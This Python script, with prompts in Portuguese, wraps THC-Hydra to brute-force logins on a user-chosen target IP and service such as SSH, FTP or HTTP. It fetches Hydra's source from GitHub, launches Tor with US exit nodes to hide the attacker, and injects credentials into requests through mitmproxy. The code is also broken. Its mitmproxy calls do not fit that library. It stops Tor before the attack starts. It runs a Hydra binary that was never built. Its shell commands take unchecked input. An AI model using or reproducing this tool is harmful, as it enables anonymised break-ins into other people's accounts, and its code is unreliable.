import subprocess
import mitmproxy
from mitmproxy import http
import stem.process
import os
import requests

THC_HYDRA_URL = "https://github.com/vanhauser-thc/thc-hydra/archive/master.zip"
THC_HYDRA_PATH = "thc-hydra-master"

def download_thc_hydra():
    response = requests.get(THC_HYDRA_URL)
    with open("thc-hydra.zip", "wb") as file:
        file.write(response.content)

    subprocess.call("unzip thc-hydra.zip", shell=True)
    os.remove("thc-hydra.zip")

def run_hydra(target, username_file, password_file, service):
    command = f"./{THC_HYDRA_PATH}/hydra -L {username_file} -P {password_file} {target} {service}"
    subprocess.call(command, shell=True)

class RequestInterceptor:
    def __init__(self, username_file, password_file):
        self.username_file = username_file
        self.password_file = password_file

    def request(self, flow: mitmproxy.http.HTTPFlow):
        with open(self.username_file, "r") as file:
            username = file.read().strip()
        with open(self.password_file, "r") as file:
            password = file.read().strip()
        flow.request.headers["Username"] = username
        flow.request.headers["Password"] = password

def start_tor():
    tor_process = stem.process.launch_tor_with_config(
        config = {
            'SocksPort': '9050',
            'ExitNodes': '{us}',
        },
        init_msg_handler = print,
    )
    return tor_process

def stop_tor(tor_process):
    tor_process.terminate()

def main():
    # Verifica se o thc-hydra já está presente no sistema
    if not os.path.exists(THC_HYDRA_PATH):
        print("THC-Hydra não encontrado. Fazendo o download...")
        download_thc_hydra()

    tor_process = start_tor()

    target = input("Digite o alvo (exemplo: 192.168.0.1): ")
    option = input("Escolha uma opção:\n1. Fornecer um único usuário e uma lista de senhas\n2. Fornecer uma lista de usuários e uma única senha\n3. Fornecer uma lista de usuários e uma lista de senhas\nOpção: ")

    if option == "1":
        username = input("Digite o nome de usuário: ")
        password_file = input("Digite o caminho para o arquivo de senhas: ")
        username_file = os.path.join(os.getcwd(), "username.txt")
        with open(username_file, "w") as file:
            file.write(username)
    elif option == "2":
        username_file = input("Digite o caminho para o arquivo de nomes de usuário: ")
        password = input("Digite a senha: ")
        password_file = os.path.join(os.getcwd(), "password.txt")
        with open(password_file, "w") as file:
            file.write(password)
    elif option == "3":
        username_file = input("Digite o caminho para o arquivo de nomes de usuário: ")
        password_file = input("Digite o caminho para o arquivo de senhas: ")
    else:
        print("Opção inválida!")
        stop_tor(tor_process)
        return

    service = input("Digite o serviço (exemplo: http-get, ftp, ssh): ")

    # Executa o THC-Hydra com base na opção selecionada
    if option == "1" or option == "2" or option == "3":
        proxy_server = mitmproxy.tools.proxy.ProxyServer()
        interceptor = RequestInterceptor(username_file, password_file)
        options = mitmproxy.tools.options.Options(listen_host='127.0.0.1', listen_port=8080)
        options.add_option("onboarding", bool, False, "Enable onboarding scripts")
        mitmproxy.tools.main.mitmweb(["-s", __file__], options=options)

    stop_tor(tor_process)
    run_hydra(target, username_file, password_file, service)

if __name__ == "__main__":
    main()
